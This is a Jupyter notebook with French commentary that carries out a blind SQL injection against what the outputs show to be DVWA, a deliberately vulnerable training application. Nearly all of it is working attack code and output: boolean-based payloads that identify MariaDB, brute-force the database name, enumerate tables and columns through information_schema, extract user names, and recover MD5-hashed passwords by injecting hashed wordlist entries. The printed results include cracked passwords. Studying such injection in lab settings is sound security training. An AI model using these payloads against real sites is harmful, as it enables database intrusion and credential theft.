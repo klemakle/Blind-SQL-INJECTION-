{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "cookies = {\n",
    "    # Cookies\n",
    "}\n",
    "\n",
    "headers = {\n",
    "    # headers\n",
    "}\n",
    "\n",
    "url = \"http://sitesVulnerable.pasLeVrai\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 121,
   "metadata": {},
   "outputs": [],
   "source": [
    "def send_request_with_wordlist(path_to_wordlist, beginnig_of_sql_request, end_of_sql_request):\n",
    "    info_found = []\n",
    "    wordlist = open(path_to_wordlist, 'r')\n",
    "    lines = wordlist.readlines()\n",
    "    for line in lines:\n",
    "        id_param = beginnig_of_sql_request  + line.strip() + end_of_sql_request\n",
    "        params = {\n",
    "            'id': id_param,\n",
    "            'Submit': 'Submit'\n",
    "        }\n",
    "        response = requests.get(url,params=params,cookies=cookies,headers=headers)\n",
    "        if response.status_code == 200:\n",
    "            print(\"[FOUND] = \", line.strip())\n",
    "            info_found.append(line.strip())\n",
    "    \n",
    "    return info_found"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<h1>1.Info de la BD</h1>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Nous allons chercher quelle base de données nous avons affaire : Mysql, PostgreSQL, Oracle, MariaDB, etc. Pour cela nous allons créer une wordlist de BD SQL les plus utilisées. \n",
    "Utilisons la variable <i style=\"color :#0F0\">@@version</i> ou <i style=\"color :#0F0\">version()</i> pour trouver cette info de la BD."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 122,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[FOUND] =  db\n",
      "[FOUND] =  maria\n",
      "[FOUND] =  mariadb\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "['db', 'maria', 'mariadb']"
      ]
     },
     "execution_count": 122,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "paramID = \"' or LOWER(@@version) LIKE '%\"\n",
    "shorlist = \"wordlist/infoDB.txt\"\n",
    "\n",
    "info_DB = send_request_with_wordlist(shorlist, paramID, \"%' -- -\")\n",
    "info_DB"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Nous savons maintenant qu'il s'agit d'une BD mariaDB."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<h1>2. Nom de la BD</h1>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 2.1 Cherchons d'abord les lettres qui commposent la base de données qui est interrogée"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 133,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[FOUND] =  a\n",
      "[FOUND] =  d\n",
      "[FOUND] =  v\n",
      "[FOUND] =  w\n",
      "Caractères qui composent le nom de la BD :  advw\n"
     ]
    }
   ],
   "source": [
    "alphabet = \"wordlist/alphabet_num.txt\"\n",
    "sql_start = \"' or DATABASE() LIKE  '%\"\n",
    "sql_end = \"%' -- -\"\n",
    "letters_in_db_name = []\n",
    "letters_in_db_name = send_request_with_wordlist(alphabet, sql_start, sql_end)\n",
    "\n",
    "\n",
    "print(\"Caractères qui composent le nom de la BD : \", \"\".join(str(i) for i in letters_in_db_name))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 2.2 Cherchons les permutations de ces lettres"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 134,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['advw', 'adwv', 'avdw', 'avwd', 'awdv', 'awvd', 'davw', 'dawv', 'dvaw', 'dvwa', 'dwav', 'dwva', 'vadw', 'vawd', 'vdaw', 'vdwa', 'vwad', 'vwda', 'wadv', 'wavd', 'wdav', 'wdva', 'wvad', 'wvda']\n"
     ]
    }
   ],
   "source": [
    "from itertools import permutations\n",
    "\n",
    "chaine = \"\".join(str(i) for i in letters_in_db_name)\n",
    "# Fonction pour trouver les permutations d'une chaîne de caractères\n",
    "def trouver_permutations(chaine):\n",
    "    resultat = permutations(chaine)\n",
    "    permutations_liste = [''.join(perm) for perm in resultat]\n",
    "    return permutations_liste\n",
    "\n",
    "permutations_chaine = trouver_permutations(chaine)\n",
    "print(permutations_chaine)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 2.3 Trouvons le vrai nom de la BD"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 113,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Le nom de la BD interrogée est : dvwa\n"
     ]
    }
   ],
   "source": [
    "db_name = \"\"\n",
    "id_param = \"' or DATABASE() LIKE  '\"\n",
    "\n",
    "for elem in permutations_chaine:\n",
    "    params = {\n",
    "        'id': id_param+elem+\"' -- -\",\n",
    "        'Submit': 'Submit', \n",
    "    }\n",
    "    response = requests.get(url,params=params,cookies=cookies,headers=headers)\n",
    "    if response.status_code == 200:\n",
    "        db_name = elem\n",
    "        break #on arrête la boucle dès qu'on trouve le nom\n",
    "\n",
    "print(\"Le nom de la BD interrogée est : \"+db_name)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<h1>3. Tables de la BD DVWA</h1>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pour trouver les tables de la BD 'dvwa', nous allons utiliser une wordlist des noms de tables les plus communs.\n",
    "La wordlist a été téléchargée de puis  ==> https://github.com/drtychai/wordlists/blob/master/sqlmap/common-outputs.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 135,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[FOUND] =  users\n",
      "[FOUND] =  User_\n",
      "[FOUND] =  Users\n",
      "[FOUND] =  guestbook\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "['users', 'User_', 'Users', 'guestbook']"
      ]
     },
     "execution_count": 135,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "tables_wordlist = open('wordlist/tables.txt', 'r')\n",
    "Lines = tables_wordlist.readlines()\n",
    "tables_found = []\n",
    "\n",
    "wordlist_of_tables = \"wordlist/tables.txt\"\n",
    "sql_start = \"' or EXISTS ( SELECT 1 FROM information_schema.tables WHERE table_schema = '\"+ db_name +\"' AND table_name LIKE '\"\n",
    "sql_end = \"') -- -\"\n",
    "tables_found = send_request_with_wordlist(wordlist_of_tables, sql_start, sql_end)\n",
    "tables_found"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 4. Colonnes de la table \"users\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pour trouver les colonnes de la table 'users', nous allons utiliser une wordlist des noms de colonnes les plus communs.\n",
    "La wordlist a été téléchargée de puis  ==> https://github.com/drtychai/wordlists/blob/master/sqlmap/common-columns.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 139,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[FOUND] =  user_id\n",
      "[FOUND] =  first_name\n",
      "[FOUND] =  last_name\n",
      "[FOUND] =  password\n",
      "[FOUND] =  user\n",
      "[FOUND] =  last_login\n",
      "[FOUND] =  user_id\n",
      "[FOUND] =  password\n",
      "[FOUND] =  user\n",
      "[FOUND] =  avatar\n",
      "les colonnes trouvées dans la table users sont : \n",
      "['user_id', 'first_name', 'last_name', 'password', 'user', 'last_login', 'user_id', 'password', 'user', 'avatar']\n"
     ]
    }
   ],
   "source": [
    "columns_found = []\n",
    "wordlist_of_columns = \"wordlist/colonnes.txt\"\n",
    "sql_start = \"' OR EXISTS (SELECT 1 FROM information_schema.columns WHERE table_schema = 'dvwa'  AND table_name = 'users' AND column_name = '\"\n",
    "sql_end = \"') -- -\"\n",
    "columns_found = send_request_with_wordlist(wordlist_of_columns, sql_start, sql_end)\n",
    "\n",
    "print(\"les colonnes trouvées dans la table users sont : \")\n",
    "print(columns_found)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 140,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Liste des colonnes trouvées : \n",
      "['user', 'user_id', 'password', 'last_login', 'first_name', 'last_name', 'avatar']\n"
     ]
    }
   ],
   "source": [
    "list_columns_found = list(set(columns_found))\n",
    "print(\"Liste des colonnes trouvées : \")\n",
    "print(list_columns_found)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 5. Enregistrement de la table users"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 171,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Nombre d'enregistrements de la table users =  5\n"
     ]
    }
   ],
   "source": [
    "line_count = 0\n",
    "for i in range(0, 100): \n",
    "    id_param = \"' OR \"+str(i)+ \" IN (SELECT COUNT(*) FROM users)  -- -\"\n",
    "    params = {\n",
    "        'id': id_param,\n",
    "        'Submit': 'Submit',\n",
    "    }\n",
    "    response = requests.get(url,params=params,cookies=cookies,headers=headers)\n",
    "    if response.status_code == 200:\n",
    "        line_count = i\n",
    "        break\n",
    "print(\"Nombre d'enregistrements de la table users = \", line_count)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 5.1 Faisons sortir les first_name de la table users"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 144,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[FOUND] =  admin\n",
      "[FOUND] =  Pablo\n",
      "[FOUND] =  Gordon\n",
      "[FOUND] =  hack\n",
      "[FOUND] =  bob\n",
      "['admin', 'Pablo', 'Gordon', 'hack', 'bob']\n"
     ]
    }
   ],
   "source": [
    "wordlist_first_name = \"wordlist/username.txt\"\n",
    "sql_start = \"' OR '\"\n",
    "sql_end = \"' IN (SELECT first_name FROM users) -- -\"\n",
    "\n",
    "list_of_first_name = send_request_with_wordlist(wordlist_first_name, sql_start, sql_end)\n",
    "print(list_of_first_name)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 5.2 last_name de la table users"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 184,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[FOUND] =  admin\n",
      "[FOUND] =  brown\n",
      "[FOUND] =  smith\n",
      "[FOUND] =  picasso\n",
      "[FOUND] =  me\n",
      "['admin', 'brown', 'smith', 'picasso', 'me']\n"
     ]
    }
   ],
   "source": [
    "wordlist_last_name = \"wordlist/username.txt\"\n",
    "sql_start = \"' OR '\"\n",
    "sql_end = \"' IN (SELECT last_name FROM users) -- -\"\n",
    "\n",
    "list_of_last_name = send_request_with_wordlist(wordlist_last_name, sql_start, sql_end)\n",
    "print(list_of_last_name)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 5.3 Info de la Colonne user"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 164,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[FOUND] =  admin\n",
      "[FOUND] =  Pablo\n",
      "['admin', 'Pablo']\n"
     ]
    }
   ],
   "source": [
    "wordlist_user = \"wordlist/username.txt\"\n",
    "sql_start = \"' OR '\"\n",
    "sql_end = \"' IN (SELECT user FROM users) -- -\"\n",
    "\n",
    "list_of_user = send_request_with_wordlist(wordlist_user, sql_start, sql_end)\n",
    "print(list_of_user)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 5.4 Info de la colonne password"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "##### 5.4.1 Essayons de voir si les mots de passe sont hashés ou non.\n",
    "Pour cela nous allons vérifier la taille des mots de passe. Si tous les mots de passe ont la même taille, alors ils sont hashés."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 155,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[PASSWORD.LENGTH.FOUND] =  32\n"
     ]
    }
   ],
   "source": [
    "for i in range(0, 100): \n",
    "    id_param = \"' OR \"+str(i)+ \" IN (SELECT LENGTH(password) FROM users)  -- -\"\n",
    "    params = {\n",
    "        'id': id_param,\n",
    "        'Submit': 'Submit',\n",
    "    }\n",
    "    response = requests.get(url,params=params,cookies=cookies,headers=headers)\n",
    "    if response.status_code == 200:\n",
    "        print(\"[PASSWORD.LENGTH.FOUND] = \", i)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Tous les mots de passe semblent avoir la même taille : 32. Donc on peut en déduire qu'ils sont hashés."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Et 32 nous fait pensé à MD5. Donc \"brute force\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "##### 5.4.2 Essayons de casser les mots de passe avec une wordlist ./wordlist/passwords.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 158,
   "metadata": {},
   "outputs": [],
   "source": [
    "import hashlib\n",
    "\n",
    "def hash_md5(chaine):\n",
    "    chaine_bytes = chaine.encode('utf-8')\n",
    "    \n",
    "    h = hashlib.md5()\n",
    "    h.update(chaine_bytes)\n",
    "    hash_md5 = h.hexdigest()\n",
    "    \n",
    "    return hash_md5"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 160,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[PASSWORD.FOUND] =  password\n",
      "[PASSWORD.FOUND] =  abc123\n",
      "[PASSWORD.FOUND] =  letmein\n",
      "[PASSWORD.FOUND] =  charley\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "['password', 'abc123', 'letmein', 'charley']"
      ]
     },
     "execution_count": 160,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "passwords_found = []\n",
    "wordlist_password = open(\"wordlist/password.txt\", 'r')\n",
    "Lines = wordlist_password.readlines()\n",
    "sql_start = \"' OR '\"\n",
    "sql_end =\"' IN (SELECT password FROM users ) -- -\"\n",
    "\n",
    "\n",
    "for line in Lines:\n",
    "    string_hashed = hash_md5(line.strip())\n",
    "    id_param = sql_start  + string_hashed + sql_end\n",
    "    params = {\n",
    "        'id': id_param,\n",
    "        'Submit': 'Submit'\n",
    "    }\n",
    "    response = requests.get(url,params=params,cookies=cookies,headers=headers)\n",
    "    if response.status_code == 200:\n",
    "        print(\"[PASSWORD.FOUND] = \", line.strip())\n",
    "        passwords_found.append(line.strip())\n",
    "\n",
    "passwords_found"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 185,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " ---------- Infos de la BD --------- \n",
      "Nom de la BD :  dvwa\n",
      "Tables de la BD : ['users', 'User_', 'Users', 'guestbook']\n",
      "\n",
      "\n",
      " ---------- Les infos de la table users récupérées --------- \n",
      "first_name :\t ['admin', 'Pablo', 'Gordon', 'hack', 'bob']\n",
      "last_name :\t ['admin', 'brown', 'smith', 'picasso', 'me']\n",
      "user :\t\t ['admin', 'Pablo']\n",
      "password :\t ['password', 'abc123', 'letmein', 'charley']\n"
     ]
    }
   ],
   "source": [
    "print(\" ---------- Infos de la BD --------- \" )\n",
    "print(\"Nom de la BD : \", db_name)\n",
    "print(\"Tables de la BD :\", tables_found)\n",
    "\n",
    "print(\"\\n\")\n",
    "print(\" ---------- Les infos de la table users récupérées --------- \" )\n",
    "print(\"first_name :\\t\", list_of_first_name)\n",
    "print(\"last_name :\\t\", list_of_last_name)\n",
    "print(\"user :\\t\\t\", list_of_user)\n",
    "print(\"password :\\t\", passwords_found)\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
